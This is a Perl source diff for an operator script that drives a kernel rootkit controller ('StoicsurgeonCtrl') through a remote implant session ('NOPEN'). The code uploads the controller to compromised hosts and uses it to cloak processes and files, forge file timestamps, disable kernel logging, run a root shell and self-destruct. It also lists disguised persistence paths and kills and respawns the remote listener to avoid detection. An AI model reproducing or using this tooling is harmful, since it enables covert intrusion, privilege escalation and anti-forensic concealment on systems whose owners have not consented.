+      push(@doopts,$ltr) unless (index($localoptltrs,$ltr) >= 0);
+      $localoptscount++     if index($localoptltrs,$ltr) >= 0;
+      $alloptscount++       if index($alloptltrs,$ltr) >= 0;
+      $enableoptscount++    if index($enableoptltrs,$ltr) >= 0;
+      $disableoptscount++   if index($disableoptltrs,$ltr) >= 0;
+      $pidoptscount++       if index($pidoptltrs,$ltr) >= 0;
+      $pathoptscount++      if index($pathoptltrs,$ltr) >= 0;
+      $nulloptscount++      if index($nulloptltrs,$ltr) >= 0;
+      $uninstalloptscount++ if index($uninstalloptltrs,$ltr) >= 0;
+    }
+  }
+  dbg("doopts=(@doopts)
+ (0 \$alloptltrs        = $alloptltrs
+    \$alloptscount      = $alloptscount
+    \$localoptltrs      = $localoptltrs
+    \$localoptscnt      = $localoptscnt
+  1 \$enableoptltrs     = $enableoptltrs
+    \$enableoptscount   = $enableoptscount
+  2 \$disableoptltrs    = $disableoptltrs
+    \$disableoptscount  = $disableoptscount
+  3 \$pidoptltrs        = $pidoptltrs
+    \$pidoptscount      = $pidoptscount
+  4 \$pathoptltrs       = $pathoptltrs
+    \$pathoptscount     = $pathoptscount
+  5 \$nulloptltrs       = $nulloptltrs
+    \$nulloptscount     = $nulloptscount
+  )");
+
+
+
+  mydie("-H is not usable with -[EeCcUn] opts nor any PIDs nor PATHs")
+    if ($dostoicdiff and ($enableoptscount or
+		       $disableoptscount or
+		       $pidoptscount or
+		       $pathoptscount or
+		       $uninstalloptscount or
+		       @paths or @pids));
+
+  # Options for autostoicctrl script:
+
+  # Options for upload/execute Ctrl:
+  $forcegettime = $opt_a;
+  $diropt = $opt_d;
+  $gettimeopt=$opt_g;
+  $settimeopt=$opt_s;
+
+  # Default to this windows pid(s) if $pidoptscount and no pids given
+  unless (!$pidoptscount or @pids or
+	  (@paths and ($opt_c or $opt_C) and !@pids)) {
+    push(@pids,$targetpid);
+    push(@pids,$targetppid) unless ($targetppid == 1);
+  }
+
+  ## ERROR CHECKING OF OPTS
+  mystoicmydie("no valid opltr given (tried $alloptltrs)")
+    unless @doopts;
+  mystoicmydie("Use only one of -s and -g at a time")
+    if ($settimeopt and $gettimeopt);
+  mystoicmydie("You can not mix enable/disable privelege options")
+    if ($enableoptscount and $disableoptscount);
+  mystoicmydie("You must only use exactly one of these options at a time: -[$pathoptltrs]")
+    if ($pathoptscount > 1);
+  mystoicmydie("You must only use exactly one of these options at a time: -[$nulloptltrs]")
+    if ($nulloptscount) > 1;
+  # Set our working dir to the one set in hostvars if there, else to
+  # our hidden directory if known, unless -w option overrides it.
+
+#TODO: only for some options we use $host_workingdir
+
+  $oldhost_workingdirwashiddendir = 1
+    if ($host_workingdir and $host_workingdir eq $host_hiddendir);
+  $workingdir = $opt_w;
+dbg("Here with
+workingdir=$workingdir=
+host_hiddendir=$host_hiddendir=
+
+
+");
+  $hiddensensitive = (($dostoicdiff or
+		       (@pids and ($disableoptscount or $enableoptscount)) or
+		       $uninstalloptscount));
+#  offerabort("DBG: hiddensensitive=$hiddensensitive=
+#enableoptscount=$enableoptscount=
+#disableoptscount=$disableoptscount=
+#pids=(@pids)
+#dostoicdiff=$dostoicdiff=
+#");
+  if ($workingdir) {
+    $workingdir =~ s,/+,/,g;
+    $workingdir =~ s,/$,,;
+    if (%host_hiddendirs and $hiddensensitive) {
+      foreach my $hdir (keys %host_hiddendirs) {
+	mystoicmydie("-w $workingdir cannot be your hidden directory with -[".
+		     $enableoptltrs.
+		     $disableoptltrs.
+		     $uninstalloptltrs."] options")
+	  if ($hdir =~ m,^$workingdir,);
+      }
+    }
+    newhostvar(host_nonhiddenworkingdir,$workingdir)
+      if ($hiddensensitive and !$host_nonhiddenworkingdir);
+  } else {
+    if (%host_hiddendirs) {
+      foreach my $hdir (keys %host_hiddendirs) {
+	if ($hdir =~ m,^$host_workingdir,) {
+	  $oldhost_workingdirwashiddendir = 1;
+	  newhostvar("host_workingdir","");
+	  newhostvar("host_workingdir{$hdir}","");
+	}
+      }
+    }
+    $workingdir = $host_workingdir
+      if ($host_workingdir and  ($gettimeopt or $settimeopt or $diropt or $stoickillopt));
+    if (!$hiddensensitive) {
+      $workingdir = $host_hiddendir if ($host_hiddendir);
+    } else {
+      my $orphanmore = "";
+      if ($targetppid eq $initpid) {
+	
+      }
+      
+      # We are doing something risky avoid hidden dir
+      $workingdir = $targetcwd;
+      $workingdir = $host_nonhiddenworkingdir
+	if ($host_nonhiddenworkingdir);
+dbg("just set workingdir=$workingdir=");
+      foreach my $hdir (keys %host_hiddendirs) {
+	if ($workingdir =~ m,$hdir,) {
+	  my $baddir = $targetcwd;
+	  $workingdir = "/tmp";
+	  $workingdir = $host_nonhiddenworkingdir if $host_nonhiddenworkingdir;
+
+	  doit("-cd $workingdir");
+	  mystoicmydie("\n\n\n".
+		       "THAT DID NOTHING!!!\n\n\n".
+		       "READ THIS CAREFULLY!!!\n\n\n".
+		       "You cannot use your current directory ($baddir, in a\n".
+		       "STOIC hidden directory) to run Ctrl -".join(" -",@doopts)." @pids.\n\n".
+		       "You are now in $workingdir, but your NOPEN prompt may not say so. If the prompt\n".
+		       "is still saying $baddir, type this to refresh\n".
+		       "your NOPEN prompt so it is accurate:\n\n".
+		       "               -cd $workingdir\n\n".
+		       "If $workingdir is executable, up-arrow and try again here,\n".
+		       "if not use -w with someplace that is..")
+	    if ($prog =~ /stoicctrl/);
+	  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+	   $serverver,$targetwdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+	    =  parsestatus(force);
+	  progprint("$prog cannot use your current directory ($baddir, in a\n".
+		    "STOIC hidden directory) to run Ctrl -".join(" -",@doopts)." @pids.\n\n".
+		    "You are now in $workingdir, but your NOPEN prompt may not say so.\n".
+		    "Type this later to refresh your NOPEN prompt so it is accurate:\n\n".
+		    "               -cd $workingdir\n\n");
+
+	  last;
+	}
+      }
+    }
+
+dbg("NOW: 
+
+
+doopts=(@doopts)
+host_w=$host_workingdir=
+gettime=$gettimeopt=
+settime=$settimeopt=
+diropt=$diropt=
+dostoicdiff=$dostoicdiff=
+disableoptscount=$disableoptscount=
+enableoptscount=$enableoptscount=
+uninstalloptscount=$uninstalloptscount=
+host_hiddendir=$host_hiddendir=
+workingdir=$workingdir=
+targetcwd=$targetcwd=
+
+
+");
+  }
+  # Revert to /tmp if not set yet or if set to hidden dir where that would be a problem.
+  my $hiddenbase = basename($host_hiddendir) if $host_hiddendir;
+dbg("inbetween workingdir=$workingdir=
+
+
+hiddenbase=$hiddenbase=
+hiddendir=$hiddendir=
+
+enableoptscount=$enableoptscount=
+workingdir=$workingdir=
+ctrluploaded=$ctrluploaded=
+hiddenbasesregexp=$hiddenbasesregexp
+
+
+");
+  if (!$workingdir or ($hiddenbase and
+		       "$workingdir$ctrluploaded" =~ /$hiddenbasesregexp/ and
+		       (
+			$dostoicdiff or
+			$enableoptscount or
+			$disableoptscount or
+			$uninstalloptscount
+		       )
+		      )
+     ) {
+    # If Ctrl is there already and in hiddendir remove it
+    if (!$workingdir) {
+      rmctrl(force);
+    }
+    $workingdir = "/tmp" ;
+    $workingdir = $host_nonhiddenworkingdir
+      if $host_nonhiddenworkingdir;
+  }
+dbg("after workingdir=$workingdir=
+
+
+hiddenbase=$hiddenbase=
+hiddendir=$hiddendir=
+
+enableoptscount=$enableoptscount=
+workingdir=$workingdir=
+ctrluploaded=$ctrluploaded=
+hiddenbasesregexp=$hiddenbasesregexp
+
+
+
+");
+  ($seedset,$path,@env) = setworkingdir($workingdir,$noupload);
+  $putdest = $workingdir;
+  
+  if ($host_hiddendir and ":$path:" =~ /:$host_hiddendir:/ and
+      (
+       $dostoicdiff or
+       $enableoptscount or
+       $disableoptscount or
+       $uninstalloptscount
+      )) {
+    myalert("Removing $host_hiddendir from your PATH, that can cause issues with ARGV=$origoptions");
+    $path = removefrompath($path,@host_hiddendirs);
+  }
+
+  if ($diropt) {
+    mystoicmydie("-d takes no arguments: @ARGV")
+      if @ARGV;
+  }
+  if ($opt_T) {
+    mystoicmydie("Only one signal can be given to -T @pids")
+      if @pids > 1;
+    $signal = shift @pids;
+  }
+  if ($seed = lc $opt_S) {
+    $seed = $1 if $seed =~ /SEED=(.+)/;
+    mystoicmydie("-S $seed is not a valid valid SEED (32 hex digits)")
+      unless $seed =~ /^[a-f0-9]{32}$/;
+  } else {
+dbg("       seed=\`echo '$nopen_hostonly_orig' | rev | tr -d '\n' | md5sum | cut -f1 -d' '\`);");
+    chomp($seed = `echo '$nopen_hostonly_orig' | rev | tr -d '\n' | md5sum | cut -f1 -d' '`);
+  }
+
+  # If both C and E are being done, we ensure E is always first,
+  # otherwise order does not matter.
+  my $optlist = "@doopts";
+  if ($optlist =~ /C.*E/) {
+    my @newopts = ("E");
+    while (@doopts) {
+      my $opt = shift @doopts;
+      push(@newopts,$opt) unless $opt eq "E";
+    }
+    @doopts = @newopts;
+  }
+
+  unless ($noupload) {
+    my $how = "noprompt";
+    $how = "forceit" if $opt_X;
+dbg("
+newstoicfile=$newstoicfile=");
+    if ($newstoicfile) {
+      $stoicctrlfile = mystoicctrl("",$newstoicfile,"Replacing old file $stoicctrlfile");
+    } else {
+      $stoicctrlfile = mystoicctrl($how);
+      #dbg("stoicctrlfile=$stoicctrlfile= how=$how=");
+      dbg("-f $stoicctrlfile:".`ls -al $stoicctrlfile 2>/dev/null`)
+	if -f $stoicctrlfile;
+      unless ($how eq "forceit") {
+	if (!$stoicctrlfile or ! -f $stoicctrlfile) {
+	  $how = "forceit";
+	  #dbg("Forcing: how=$how=");
+	  $stoicctrlfile = mystoicctrl($how);
+	}
+      }
+    }
+    mystoicmydie("mystoicctrl($how) returned no valid local Stoicsurgeon-Ctrl file")
+      unless $stoicctrlfile;
+  }
+  my @timeargs=();
+  if ($settimeopt) {
+    @timeargs = @pids;
+    @pids = ();
+    mystoicmydie("Malformed -s time set command, files must be complete paths")
+      if (@therest);
+    if (@paths > 1) {
+      my $srcfile = shift(@paths);
+      mydie("Syntax error: Cannot use integer times on more than one file")
+	  if (@timeargs);
+      @timeargs = ();
+      mystoicmydie("invalid -ctrl -s syntax: Use either of these:\n".
+		   "   -ctrl -s /path/to/srcfile /path/to/targetfile1 [/path/to/more]\n".
+		   "   -ctrl -s /path/to/targetfile atime a_nsec mtime m_nsec ctime c_nsec\n".
+		   "")
+	unless (@paths);
+      putctrl();
+      mydoit("-setenv SEED=$seed")
+	unless ($seedset eq $seed);
+      my @tmpopts = ("g");
+      my ($newtimes,$newnopen,@newtimes) = 
+	doctrl(\@tmpopts,$srcfile);
+      chomp($newtimes[0]);
+      $extraargs = $newtimes[0];
+      @timeargs = split(/\s+/,$newtimes[0]);
+      $settimeopt=0;
+    } else {
+      mystoicmydie("Missing time arguments, six integers required:\n".
+		   "atime atime_nsec mtime mtime_nsec ctime ctime_nsec")
+	unless @timeargs >= 6;
+      $extraargs = "@timeargs";
+    }
+  } else {
+    mystoicmydie("PIDs can never be 0 or 1, bad pids: @zeros @ones")
+      if (@zeros or @ones);
+    mystoicmydie("You cannot combine PIDs and PATHs: @pids @paths")
+      if (@pids and @paths);
+    mystoicmydie("Invalid command line arguments: @therest
+
+therest=(@therest) has ".scalar @therest. " elements
+
+
+")
+      if (@therest and "@therest");
+  }
+  if (%host_hiddendirs and $hiddensensitive and $targetppid ne $initpid and !$lsdiropt) {
+    my ($a,$ies,$the) = (" a","y","the");
+    ($a,$s) = ("","ies","one of the") if (scalar keys %host_hiddendirs > 1);
+    my ($s2) = "s";
+    $s2 = "" unless (@doopts > 1);
+    my $dirlist = "   ".join("\n   ",keys %host_hiddendirs);
+    offerabort($COLOR_FAILURE."You have$a hidden director$ies:\n".
+	       $dirlist."\n\n".
+	       "If you <C>ontinue with the $optlist option$s2, $prog will ORPHAN your\n".
+	       "window (i.e., kill your parent/listener and start a new one here in\n".
+	       "$targetcwd). This protects us from having a parent pid associated with $the\n".
+	       "hidden director$ies. The NEW listener will also get the $optlist option$s2 applied.");
+    my ($listenoutput) = doit("kill -9 $targetppid",
+			      "-listen $targetport",);
+    @pids = grep ! /^$targetppid$/ , @pids;
+    my ($newpid) = $listenoutput =~ /noclient: server successfully forked new process at PID (\d+)\D/;
+    push(@pids,$newpid) if ($newpid > 1);
+    $targetppid = $initpid;
+
+  }
+} #myinit
+
+sub mydoit {
+  local (@what) = (@_);
+  my ($o,$n,@o) = doit(@_);
+  $completeoutput .= $o;
+  push (@completeoutput,@o);
+  return ($o,$n,@o);
+}
+
+sub doctrl {
+  local ($optsptr,@args) = (@_);
+  my ($errs,$douninstalllast) = ();
+  my ($ctrloutput,$ctrlnopenlines,@ctrloutput);
+  my %setalready = ();
+  foreach my $optltr (@$optsptr) {
+#dbg("In doctrl(@_) at optltr=$optltr");
+    if ($optltr eq "U" or $optltr eq "n") {
+      $douninstalllast = $optltr;
+      next;
+    }
+    foreach my $arg (@args) {
+      next unless $arg;
+      my $cmd = ".$ctrlltr -$optltr $arg $extraargs ; echo \$?";
+      $cmd = ".$ctrlltr -$optltr ; echo \$?" if $optltr =~ /[Uund]/;
+      my $shcmd = $cmd;
+      $shcmd =~ s/ ; echo.*//;
+      my $lcmd = "-lsh echo \"\\\\#RUNNING CTRL: $shcmd\"";
+      $lcmd =~ s/\s+$//g;
+      $cmd =~ s/ +/ /g;
+#      if (!$redodirtest and $optltr eq "d" and $host_hiddendir and $host_hiddendir_viastoic) {
+#	progprint($COLOR_NORMAL.
+#		 "\n\nHidden directory was previously determined to be:\n\n  ".
+#		 $COLOR_FAILURE.
+#		 $host_hiddendir.$COLOR_NORMAL.
+#		 "\n\n(Use -R to  find it anew2 on target.)"
+#		);
+#	next;
+#      }
+      if ($optltr eq "g" and $host_gottimes{$arg} and !$forcegettime) {
+       #$lcmd = "-lsh echo \"\\\\#RUNNING CTRL: $shcmd\"";
+	my $results = $host_gottimes{$arg};
+	$results =~ s,\n,\\\\n,g;
+	$lcmd = "-lsh echo \"\\\\#USING EARLIER RESULT FOR $arg: $results\"";
+	mydoit($lcmd);
+	$ctrloutput = $host_gottimes{$arg};
+	@ctrloutput = split(/\n/,$host_gottimes{$arg});
+      } else {
+	mydoit($lcmd);
+	($ctrloutput,$ctrlnopenlines,@ctrloutput) = mydoit($cmd);
+	newhostvar("host_gottimes{$arg}",$ctrloutput)
+	  unless (length $host_gottimes{$arg});
+      }
+      if ($gettimeopt) {
+	push(@setpastables,"-gs stoicctrl -As $arg $ctrloutput[0]")
+	  if ($ctrloutput[0] =~ /\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+/ and
+	      !$setalready{$arg}++
+	     );
+      } elsif ($optltr eq "d" and @ctrloutput) {
+	my $hdir = $ctrloutput[0];
+dbg("We got -ctrl -d ctrloutput=(@ctrloutput) hdir=$hdir=");
+	if ($hdir =~ m,^/,) {
+	  newhostvar("host_hiddendir",$hdir,
+		     "hiddendir_viastoic","yes");
+	} else {
+	  newhostvar("host_hiddendir","",
+		     "hiddendir_viastoic","");
+	}
+      }
+      my @notfound = grep /^(sh: .$ctrlltr: not found)$/,@completeoutput;
+      if (@notfound) {
+	# If we ever try to use ctrl and it is not there, we die.
+	# What removed it? 
+	rmctrl(force);
+	mydie("FAILURE:\n\n".
+	      "FAILURE: StoicsurgeonCtrl .$ctrlltr is not there and should be,\n".
+	      "         did you manually remove it? Try again and a fresh one\n".
+	      "         will be uploaded.");
+      }
+#      $ctrloutputcumulative .= $ctrlnopenlines.$ctrloutput;
+      if ($ctrloutput[$#ctrloutput] eq "0") {
+	dbg("Success doing $cmd in autostoicctrl");
+      } else {
+	$cmd =~ s/ ; .*//g;
+	if ($ctrloutput[$#ctrloutput] ne "1") {
+	  # Force this to 0 as who knows what just happened.
+	  $reusestoic=0;
+	  mystoicmydie(" StoicsurgeonCtrl command \"$cmd\" return value is non-zero but not 1 as expected: $ctrloutput[$#ctrloutput]");
+	}
+	mywarn(" StoicsurgeonCtrl command \"$cmd\" return value is 1");
+	$warnings++;
+	push(@finalout,
+	     " StoicsurgeonCtrl command \"$cmd\" return value is 1");
+#dbg("completeoutput=(@completeoutput)");
+      }
+    }
+  }
+  if ($douninstalllast) {
+    my $cmd = ".$ctrlltr -$douninstalllast ; echo \$?";
+    my $usage = "REMOVED";
+    my $partially = " (UNPATCHED)" if ($douninstalllast ne "U");
+    my $which = "UNINSTALL";
+    $which = "UNPATCH" if ($douninstalllast eq "n");
+    my $lcmd = "-lsh echo \"\\\\#RUNNING CTRL/$which: .$ctrlltr -$douninstalllast\"";
+    $lcmd =~ s/\s+$//g;
+    $cmd =~ s/ +/ /g;
+    mydoit($lcmd);
+    ($ctrloutput,$ctrlnopenlines,@ctrloutput) = mydoit($cmd);
+#    $ctrloutputcumulative .= $ctrlnopenlines.$ctrloutput;
+    # Regardless of success here, we unset this likely dead variable
+    my ($ver) = $stoicctrlfile =~ /([\d\.]+)/;
+    if ($stoicctrlfile =~ m,install.*/up/,) {
+      my $etcfile = $stoicctrlfile;
+      $etcfile =~ s,up/.*,etc/VERSION,;
+      $ver = $1 if (`grep -i stoic $etcfile` =~ /v([\d\.]+)/);
+    }
+    $ver = "0.0.0.0" unless $ver;
+    if ($ctrloutput[$#ctrloutput] eq "0") {
+      dbg("Success doing $cmd in autostoicctrl in douninstalllast=$douninstalllast=");
+      my $at = gmtime();
+      my ($content,$warning) = logtool(
+				       "STOICSURGEON",
+				       "$ver",
+				       "SUCCESSFUL",
+				       "$usage",
+				       "Uninstalled at $time via $prog $origargs$partially: hidden was $host_hiddendirlist, other tools may have been present, installed STOIC version may differ from the version of Ctrl used here",
+				      );
+    } else {
+      $cmd =~ s/ ; .*//g;
+      mywarn(" StoicsurgeonCtrl command \"$cmd\" return value is non-zero: $ctrloutput[$#ctrloutput]");
+      push(@finalout,
+	   " StoicsurgeonCtrl command \"$cmd\" return value is non-zero: $ctrloutput[$#ctrloutput]");
+      $warnings++;
+      dbg("FAILED doing $cmd in autostoicctrl in douninstalllast=$douninstalllast=");
+      my $at = gmtime();
+      my ($content,$warning) = logtool(
+				       "STOICSURGEON",
+				       "$ver",
+				       "FAILED",
+				       "$usage",
+				       "Uninstall attempted at $time via $prog $origargs$partially: hidden was $host_hiddendirlist, other tools may have been present, installed STOIC version may differ",
+				      );
+    }
+    $allcontent .= $content if defined $allcontent;
+    $allwarning .= $warning if defined $allwarning;
+  }
+  @errs = grep /^(1|sh: .$ctrlltr: not found)$/,@completeoutput;
+#completeoutput=(@completeoutput)
+dbg("
+
+errs=(@errs)
+");
+  return ($ctrloutput,$ctrlnopenlines,@ctrloutput);
+}#doctrl
+
+sub findstoicfiles {
+  my @hiddendirs = ();
+  my @safehiddendirs = ();
+  my ($hiddendir,$safehiddendir,@output) =
+    gethiddendir(1,0,\@hiddendirs,\@safehiddendirs,"nosleep",$startpath);
+  my @lslist = ();
+  dbg("In findstoicfiles(@_)
+hiddendirs=@hiddendirs=
+safehiddendirs=@safehiddendirs=");
+  foreach my $safehiddendir (@safehiddendirs) {
+    dbg("gethiddendir() = ($hiddendir,$safehiddendir,@output)");
+    push @lslist,"$safehiddendir*";
+  }
+  foreach $pre ("audit","boot","cache","core","cron","init","inet",
+		"filesys","key","ntp","root","sys","rpc","rpcd","vol") {
+    foreach $suf ("adm?","agen?","con?","clien?","inf?","mg?","stat?","ser?","svc?") {
+      push(@lslist,
+	   "/*bin/$pre$suf",
+	   "/usr/*bin/$pre$suf",
+	   "/etc/rc*/*/S85$pre$suf",
+	   "/etc/rc*/S85$pre$suf",
+	  );
+      push(@lslist,
+	   "/etc/sysconfig/modules/$pre$suf.modules"
+	  ) if $linuxtarget;
+    }
+  }
+  if ($linuxtarget) {
+    push(@lslist,
+	 "/*bin/initseria?",
+	 "/usr/*bin/initseria?",
+	 "/etc/rc.seria?",
+	 "/etc/rc.d/rc.seria?",
+	 "/*bin/modloa?",
+	 "/usr/*bin/modloa?",
+	 "/etc/rc.d/rc.module?",
+	 "/etc/rc.module?",
+	 "/etc/conf.d/rc-extr?",
+	 "/lib/bootcycl?/stat?",
+	 "/*bin/stat?",
+	 "/usr/*bin/stat?",
+	 "/var/tmp/faipprep00?",
+
+	 # Debian/Ubuntu (splash)
+	 "/lib/init/splash-function?",
+	 "/lib/init/splash-setting?",
+	 "/usr/*bin/splash-setting?",
+	 "/*bin/splash-setting?",
+
+	);
+  }
+#  dbg("lslist=($lslist)\n\n\n\n\n\nlength: ".length $lslist);
+  return nopenlss("-U",@lslist);
+}#findstoicfiles
+
+sub putctrl {
+  local ($leaveup) = (@_);
+  $reusestoic++ if $leaveup and !$reusestoic;
+  # Figure out safe letter only first time through
+  if ($ctrluploaded) {
+#    do "$optmp/stoicuploaded.$nopen_rhostname"
+#      if -s "$optmp/stoicuploaded.$nopen_rhostname";
+    newhostvar();
+#    dbg("In putctrl(@_) with ctrluploaded=$ctrluploaded and \$ctrluploaded{$key}=".$ctrluploaded{$key}."=");
+    return;
+  }
+  my $tryltr = $ctrlltr;
+  while ($ctrlltr eq "b") {
+    $tryltr = chr(ord($tryltr)+1);
+    my ($remoteexists,$nopenlines,@output)
+      = mydoit("-ls $putdest/.$tryltr");
+    mystoicmydie("This is very odd...we got to z and still no go.")
+      if ($tryltr eq "z");
+    next if $remoteexists;
+    $ctrlltr = $tryltr;
+  }
+  ($output,$nopenlines,@output) = mydoit("-ls -d $putdest");
+  mystoicmydie("$putdest does not exist")
+    unless ($output and $output =~ /^\s*d.* $putdest$/);
+  ($output,$nopenlines,@output) =
+    mydoit("-put $stoicctrlfile $putdest/.$ctrlltr");
+#  for (my $i=0;$i<@output;$i++) {
+#    dbg("output[$i]=$output[$i]=");
+#  }
+  my ($size) = (split(/\s+/,$output[$#output]))[4];
+  my $localsize = -s $stoicctrlfile;
+  unless ($size == $localsize) {
+    mystoicmydie("Cannot continue, uploaded file not correct size ($size != $localsize)");
+  }
+  my $dest = "";
+  my $depth = $targetcwd;
+  $depth =~ s,[^/],,g;
+  $depth = length($depth);
+  $dest .= "../" while ($depth--);
+  #dbg("depth=$depth= dest=$dest=");
+  if ($putdest eq ".") {
+    $dest .= $targetcwd;
+  } else {
+    $dest .= $putdest;
+  }
+  $dest =~ s,/+,/,g;
+  newhostvar(ctrluploaded,"$dest/.$ctrlltr",
+	     "ctrluploaded{$putdest/.$ctrlltr}",$stoicctrlfile,
+	     ctrlltr,$ctrlltr,
+	    );
+  if ($pauseafterupload) {
+    offerabort("Pausing after Ctrl upload, as requested with -b option.");
+  }
+}#putctrl
+
+sub mystoicmydie {
+  rmctrl() if $socket;
+dbg("
+
+socket=$socket=
+
+just called rmctrl()
+
+
+
+in mystoicmydie(@_) with killstrings=(@killstrings)");
+  mydie("\n\n@_");
+}#mystoicmydie
+
+sub setworkingdir {
+  local ($wdir,$noupload) = (@_);
+  dbg("In setworkingdir(@_)");
+  my (@mypath,$mypath,$myseed) = ();
+  if ($wdir and !$noupload) {
+    # Remove trailing slash if any
+    $wdir =~ s,/+$,,;
+
+    mystoicmydie("Invalid working directory, must be full PATH: -w $wdir")
+      unless (!$wdir or $wdir =~ m,/,);
+    mystoicmydie("Cowardly refusing to work out of /")
+      if $wdir eq "";
+#    my ($output,$nopenlines,@output) = mydoit("-ls -d $wdir");
+#    mystoicmydie("-w $wdir does not exist")
+#      unless $output;
+#    mystoicmydie("-w $wdir must be a directory")
+#      unless $output =~ m,^\s*d.* $wdir$,;
+
+    if ($host_workingdir and $host_workingdir ne $wdir) {
+      progprint("RESETTING host-wide variable host_workingdir from:\n".
+		"  $host_workingdir to $wdir",
+		$COLOR_FAILURE);
+    }
+    # Remember this dir for future use
+    newhostvar("host_workingdir",$wdir);
+
+    # Good to use it, add to path and set $putdest to there.
+    # When adding path, we remove any hiddens if that is not safe.
+    my $extrapathopt = $hiddensensitive ? "NOHIDDEN" : "";
+    @myenv = nopenaddpath($extrapathopt,$wdir);
+    foreach (@myenv) {
+      $mypath = $1
+	if /^PATH=(.*)$/;
+      $myseed = $1
+	if /^SEED=(.*)$/;
+    }
+  }
+  return ($myseed,$mypath,@myenv);
+}
+
+sub setusagetexts {
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=stoicctrl\" is used.
+
+";
+  $gsusagetext="
+Usage:
+
+$prog replaces the now defunct (and dangerous) NOPEN builtin \"-ctrl\".
+
+The correct $opup/stoicctrls/stoicsurgeon_ctrl* is determined and used
+with the correct options to replace what -ctrl used to do. This includes the
+\"-r\" functionality and a new \"-D\" option (-C/-E and -c/-e, respectively,
+on this NOPEN server and its non-1 parent when no PID is given).
+
+If the PID(s) is not given on command line, it defaults to your PID and
+your parent's PID (if not 1).
+
+$prog allows you to give multiple options and/or multiple arguments to
+those options. You can give several option letters (that make sense) and/or
+several PIDs or several PATHs (not both). When setting times on files, you
+can give several destination files and either a reference source file or
+the time integers to set (atime a_nsec mtime m_nsec ctime c_nsec). E.g.:
+
+     -ctrl -kU
+     -ctrl -EC 12345 54321 44332
+     -ctrl -g  /etc/passwd /etc/shadow /etc
+     -ctrl -s  /path/to/srcfile /path/to/targ1 [ /path/to/targ2 ...]
+     -ctrl -s  /etc/passwd /etc/shadow /etc ### ### ### ### ### ###
+
+## Options passed to Ctrl:
+########################################################
+ -C [pid|/file/path]  Cloak the process or file path
+ -c [pid|/file/path]  Uncloak the process or file path
+ -s /file/path atime atime_nsec mtime mtime_nsec ctime ctime_nsec
+                   Set the times associated with a file path
+ -g /file/path     Get the times associated with a file path
+ -s /file/path0 /file/path1 [ /file/path2 [ /file/path3 ] ]
+                   Uses Ctrl -g on /file/path0, then runs Ctrl -s
+                   with those times on the remaining /file/pathNs.
+ -d                Display default cloaked directory
+ -E pid            Enable ability to see cloaked
+                   processes and files and call into the kernel services.
+ -e pid            Disable ability to see cloaked
+                   processes and files and call into the kernel services.
+ -F pid            Enable ability to see cloaked files ONLY
+ -f pid            Disable ability to see cloaked files ONLY
+ -P pid            Enable ability to see cloaked processes ONLY
+ -p pid            Disable ability to see cloaked processes ONLY
+ -K pid            Designate as to be killed upon shutdown
+ -k pid            Designate as to NOT be killed upon shutdown
+ -L N              Disable kernel logging for N seconds
+ -r /bin/sh        Execute the program as the root user
+ -T signal         Send signal to all killable cloaked processes
+ -U                Invoke a full uninstall (self destruct)
+ -n                Invoke a partial uninstall (unpatch and unload)
+
+## autostoicctrl GSOPTS
+########################################################
+  -h        Show this help
+  -v        Show version
+  -a        When using -g, force getting CURRENT result when older one is
+            not desired for some reason (should NEVER need this)
+  -H        Compare output from the following commands, done first without
+            priveleges, then with:
+                =ps, netstat -an$extranetstatops, and -ctrl -W (looking for hidden)
+            (similar to =psdiff for IN, just mor ecomplete. implies -w /tmp.)
+  -H [?]    With one or more arguments, you can limit which commands you
+            compare. Arguments can be ps or =ps (both will do =ps), ls or -ls
+            (both do the -ctrl -W), and netstat.
+             - One argument can be \"nosleep\", which avoids the delay before
+               the differences are summarized for you.
+             - To do something other than the default ps and netstat commands,
+               the argument can be the complete command, except with any spaces
+               replaced with underscores (which are removed before executed).
+                 E.g.:      -ctrl -H /usr/ucb/ps_auxww   netstat_-a
+  -W        Where is Stoic? Looks for all possible STOIC remnants safely
+            (? wildcard is used so you can do this unpriveleged)
+  -i file   Read list of target files from this local file (for -C or -g)
+  -o file   Save output locally to file (in $optmp unless full path)
+  -w dir    Use \"dir\" as location to upload/execute
+  -R        Re-do the -L/-d option to discover anew the hidden directory.
+  -X        Re-set--do not use previously determined Ctrl binary, you
+            will instead be prompted for one.
+  -A        Do NOT delete uploaded Ctrl file, later calls to $prog will
+            re-use the one up there if it is there. Any call to $prog
+            WITHOUT -A will result in the Ctrl there being deleted.
+  -N file   New Stoicsurgeon-Ctrl file, different from previously used
+            on target (used after STOIC upgrade).
+  -b        Pause after uploading Ctrl (to allow another window to \"bless\" it)
+  -z        Clear previous $prog output from global \@completeoutput
+  -L [R|N]  Do a safe (wildcarded) -ls to find hidden dir if it is there.
+            NOTE: This also finds hidden IN dir, if any. [R|N] is required:
+                  -LR   : Do a fresh -ls to see if hidden state has changed
+                  -LN   : Use previous results if positive for a hidden dir.
+  -l        Like -L, but also does a recursive -ls of the directory if found.
+  -S SEED   Use this SEED rather than calculating from target hostname
+
+Usage: $prog \[GSOPTS\] OPTIONS PATH [PATH2 [PATH3]...]
+       $prog \[GSOPTS\] OPTIONS PID [PID2 [PID3]...]
+       $prog \[GSOPTS\] -T SIGNAL
+
+";
+}#setusagetexts
